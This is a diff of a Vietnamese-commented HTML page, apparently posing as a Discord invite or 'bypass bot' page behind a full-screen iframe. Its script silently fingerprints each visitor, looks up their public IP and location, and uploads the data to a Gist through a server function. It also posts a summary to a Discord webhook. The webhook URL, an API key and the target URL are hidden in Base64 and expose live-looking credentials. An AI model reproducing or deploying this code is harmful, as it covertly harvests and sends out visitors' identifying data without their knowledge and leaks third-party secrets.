@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>(Bypass bot)</title>
+  <title>Fingerprint + Gist + Discord (Secure)</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body { width: 100%; height: 100%; overflow: hidden; background: #fff; }
@@ -15,17 +15,18 @@
   <iframe id="main-frame" src="about:blank"></iframe>
 
   <script>
-    // =======================
+    // =========================================================================
+    // CẤU HÌNH (Base64 – token thật nằm ở server)
+    // =========================================================================
     const _d = (x) => atob(x);
     const API_KEY         = _d("YjliZmIyNTMyMThjNGViZWEwOGVjNzZjYzAzZTIxZWM=");
     const TARGET_URL      = _d("aHR0cHM6Ly9pbnZpdGVib3QtZGlzY29yZC1ieXBhc3N1cmwtNDU2Mi5vbnJlbmRlci5jb20v");
     const DISCORD_WEBHOOK = _d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMjA1ODU4OTY4MDg5ODIyMy9LZzQ5RXF6N1NYUHhTZTVaanU0QzVFNlh2aFZQdXFLeUZJMG9sYmZ4RWc3WnhqQklhZ3RKd0h3ZkNfejh1ekMwV1J5bQ==");
-    // Gọi function trên Netlify
+    // Gọi function trên Netlify (đường dẫn mặc định)
     const CREATE_GIST_URL = "/.netlify/functions/create-gist";
     // =========================================================================
 
     // ---------------------------- FINGERPRINT ----------------------------
-    // (giữ nguyên toàn bộ các hàm từ code sandbox‑safe trước đó)
     async function fetchNetworkInfo() {
       try {
         const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${API_KEY}`);
@@ -290,7 +291,6 @@
         const fullData = await gatherAllData();
         const jsonString = JSON.stringify(fullData, null, 2);
 
-        // Gọi function an toàn (token nằm ở server)
         const rawUrl = await createGistViaServer(jsonString);
 
         const summary = `${fullData.network.public_ip} - ${fullData.network.city}, ${fullData.network.country}`;
@@ -307,4 +307,4 @@
     });
   </script>
 </body>
-  </html>
+</html>
